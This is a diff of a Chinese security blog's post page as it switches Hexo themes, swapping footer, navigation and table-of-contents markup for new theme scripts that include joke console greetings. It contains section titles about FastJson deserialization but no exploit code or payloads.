+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
         
-            <li>
-                <strong>更新于
-                    :</strong> 2023-11-12 11:33:35
-            </li>
-        
-        <li>
-            <strong>链接:</strong> https://redefine.ohevan.com//post/FastJson反序列化.html
-        </li>
-        <li>
-            <strong>
-                版权声明:
-            </strong>
-            
-
-            
-                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
-            
-        </li>
-    </ul>
-</div>
-
-            </div>
-        
-
-        
-
-        
-
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/post/%E5%86%85%E5%AD%98%E9%A9%AC-tomcat%E7%B1%BB%E5%85%A8%E7%B1%BB%E5%9E%8B%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0.html"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">tomcat内存马学习（未完全）</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/post/JNDI%E6%B3%A8%E5%85%A5.html"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">JNDI初步学习</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container pjax">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fa-solid fa-comments"></i>&nbsp;评论
-    </div>
-    
-
-        
-            
-    <div id="waline"></div>
-    <script type="module" data-swup-reload-script>
-      import { init } from '/js/libs/waline.mjs';
-
-      function loadWaline() {
-        init({
-          el: '#waline',
-          serverURL: 'https://example.example.com',
-          lang: 'zh-CN',
-          dark: 'body[class~="dark-mode"]',
-          requiredMeta: ['nick', 'mail']
-        });
-      }
-
-      if (typeof swup !== 'undefined') {
-        loadWaline();
-      } else {
-        window.addEventListener('DOMContentLoaded', loadWaline);
-      }
-    </script>
-
-
-
-        
-    
-</div>
-
-            </div>
-        
-    </div>
-
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">此页目录</div>
-        <div class="page-title">FastJson反序列化学习</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-FastJson%E6%A6%82%E8%BF%B0"><span class="nav-text">1.FastJson概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0"><span class="nav-text">fastjson简单实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FastJson%E6%A0%B9%E6%8D%AE%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">FastJson根据字符串任意反序列化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">FastJson反序列化流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#type%E6%8C%87%E5%AE%9A%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="nav-text">@type指定加载类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E6%8C%87%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%8F%82%E6%95%B0%E5%A4%84%E7%90%86"><span class="nav-text">对指定类的参数处理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-text">FastJson流程总结以及漏洞点分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E7%9A%84%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="nav-text">FastJson漏洞利用前的流程总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="nav-text">FastJson反序列化漏洞攻击利用总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB-JdbcRowSetImpl%E5%88%86%E6%9E%90"><span class="nav-text">入口类 JdbcRowSetImpl分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88Bcel%EF%BC%89%E5%85%A5%E5%8F%A3%E7%B1%BBClassLoaderEXP%E5%88%86%E6%9E%90"><span class="nav-text">（Bcel）入口类ClassLoaderEXP分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87"><span class="nav-text">FastJson高版本绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-25%E4%B9%8B%E5%90%8E%E7%9A%84%E6%96%B0%E5%A2%9Ewaf%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">1.2.25之后的新增waf检测流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mapping%E7%BC%93%E5%AD%98%E7%BB%95%E8%BF%87%E6%B5%81%E7%A8%8B"><span class="nav-text">mapping缓存绕过流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="nav-text">FastJson快速复习总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FastJson1-2-24%E6%B5%81%E7%A8%8B"><span class="nav-text">FastJson1.2.24流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FastJson"><span class="nav-text">FastJson&lt;&#x3D;1.2.47高版本绕过</span></a></li></ol></li></ol>
-
-    </div>
-</div>
-        </div>
-    
-</div>
-
-
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
-    <div class="info-container py-3 text-center">
-        
-        <div class="text-center">
-            &copy;
-            
-              <span>2022</span>
-              -
-            
-            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">stoocea</a>
-        </div>
-        
-            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
-                
-                    <span id="busuanzi_container_site_uv" class="lg:!block">
-                        <span class="text-sm">访问人数</span>
-                        <span id="busuanzi_value_site_uv"></span>
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv" class="lg:!block">
-                        <span class="text-sm">总访问量</span>
-                        <span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
-            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
-        </div>
-        
-        
-            <div>
-                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
-            </div>
-        
-        
-            <script data-swup-reload-script>
-                try {
-                    function odometer_init() {
-                    const elements = document.querySelectorAll('.odometer');
-                    elements.forEach(el => {
-                        new Odometer({
-                            el,
-                            format: '( ddd).dd',
-                            duration: 200
-                        });
-                    });
-                    }
-                    odometer_init();
-                } catch (error) {}
-            </script>
-        
-        
-        
-    </div>  
-</footer>
-        </div>
-    </div>
-
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
-
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
-</div>
-
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-
-</main>
-
-
-    
-<script src="/js/libs/Swup.min.js"></script>
-
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
-
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
-
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
-
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
-
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
-
-<script>
-    const swup = new Swup({
-        plugins: [
-            new SwupScriptsPlugin({
-                optin: true,
-            }),
-            new SwupProgressPlugin(),
-            new SwupScrollPlugin({
-                offset: 80,
-            }),
-            new SwupSlideTheme({
-                mainElement: ".main-content-body",
-            }),
-            new SwupPreloadPlugin(),
-        ],
-        containers: ["#swup"],
-    });
-</script>
-
-
-
-
-
-
-
-<script src="/js/tools/imageViewer.js" type="module"></script>
-
-<script src="/js/utils.js" type="module"></script>
-
-<script src="/js/main.js" type="module"></script>
-
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
-
-
-
-
-
-    
-<script src="/js/tools/codeBlock.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/layouts/lazyload.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/tools/runtime.js"></script>
-
-    
-<script src="/js/libs/odometer.min.js"></script>
-
-    
-<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
-
-
-
-
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 stoocea 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="java"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
   
-<script src="/js/libs/Typed.min.js"></script>
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
 
-  
-<script src="/js/plugins/typed.js" type="module"></script>
+  typeof typed === 'object' && typed.destroy()
 
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
 
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
 
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
 
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
 
+  typeof panguInit === 'function' && panguInit()
 
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
 
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/libs/anime.min.js"></script>
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
 
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
 
-<script src="/js/layouts/toc.js" type="module"></script>
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
 
-<script src="/js/plugins/tabs.js" type="module"></script>
-
-    
-</div>
-
-
-</body>
-</html>
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
